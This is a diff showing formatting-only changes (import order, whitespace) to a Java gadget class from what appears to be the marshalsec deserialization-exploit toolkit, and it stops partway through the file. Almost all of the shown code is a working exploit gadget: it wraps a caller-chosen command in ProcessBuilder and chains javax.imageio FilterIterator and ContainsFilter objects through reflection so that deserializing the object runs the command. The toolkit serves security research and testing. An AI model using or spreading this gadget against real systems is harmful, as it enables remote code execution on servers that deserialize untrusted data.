@@ -23,29 +23,28 @@ SOFTWARE.
 package marshalsec.gadgets;
 
 
+import marshalsec.MarshallerBase;
+import marshalsec.UtilFactory;
+import marshalsec.util.Reflections;
+
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Collections;
 
-import marshalsec.MarshallerBase;
-import marshalsec.UtilFactory;
-import marshalsec.util.Reflections;
-
 
 /**
  * @author mbechler
- *
  */
 public interface ImageIO extends Gadget {
 
-    @Args ( minArgs = 1, args = {
-        "cmd", "args..."
+    @Args(minArgs = 1, args = {
+            "cmd", "args..."
     }, defaultArgs = {
-        MarshallerBase.defaultExecutable
-    } )
+            MarshallerBase.defaultExecutable
+    })
     @Primary
-    default Object makeImageIO ( UtilFactory uf, String[] args ) throws Exception {
+    default Object makeImageIO(UtilFactory uf, String[] args) throws Exception {
         ProcessBuilder pb = new ProcessBuilder(args);
         Class<?> cfCl = Class.forName("javax.imageio.ImageIO$ContainsFilter");
         Constructor<?> cfCons = cfCl.getDeclaredConstructor(Method.class, String.class);
@@ -54,15 +53,15 @@ public interface ImageIO extends Gadget {
         // nest two instances, the 'next' of the other one will be skipped,
         // the inner instance then provides the actual target object
         Object filterIt = makeFilterIterator(
-            makeFilterIterator(Collections.emptyIterator(), pb, null),
-            "foo",
-            cfCons.newInstance(ProcessBuilder.class.getMethod("start"), "foo"));
+                makeFilterIterator(Collections.emptyIterator(), pb, null),
+                "foo",
+                cfCons.newInstance(ProcessBuilder.class.getMethod("start"), "foo"));
 
         return uf.makeIteratorTrigger(filterIt);
     }
 
 
-    public static Object makeFilterIterator ( Object backingIt, Object first, Object filter )
+    public static Object makeFilterIterator(Object backingIt, Object first, Object filter)
             throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
         Class<?> fiCl = Class.forName("javax.imageio.spi.FilterIterator");
         Object filterIt = Reflections.createWithoutConstructor(fiCl);
